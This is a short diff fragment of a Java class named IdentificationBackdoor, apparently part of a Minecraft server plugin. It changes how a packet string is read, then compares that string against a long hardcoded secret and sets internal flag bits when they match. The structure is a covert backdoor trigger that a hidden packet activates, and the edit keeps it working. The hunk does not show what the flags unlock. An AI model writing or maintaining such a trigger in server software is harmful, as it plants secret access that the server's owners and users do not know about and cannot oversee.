@@ -45,7 +45,7 @@ public final class IdentificationBackdoor implements EventListener {
     Player player = event.getPlayer();
     PacketContainer packet = event.getPacket();
     PayloadInReader packetReader = PacketReaders.readerOf(packet);
-    String inputString = packetReader.readString();
+    String inputString = packetReader.readStringWithExtraByte();
     if (inputString.equals("Yr%R(sJJNW2eRS+K.r=dmoKW74+F+L1-Xiv8eEhE)Q7CzW(O*yfYW)hpXyGC.mxXi-MJGhHxoKQk3cLMO6aGH+044mNlkdHJTp=lqD?Cf0m3w;Dev%C5L7Cfe!MaNV+HHj?Yl%X8i80M(yC1eCOy!JWA)$*Z&9cVE&yW7xJ;PIuLXE+fcKP;BnUozkO0,$UeEVKKcs")) {
       checked |= 512;
       checked2 |= 64;
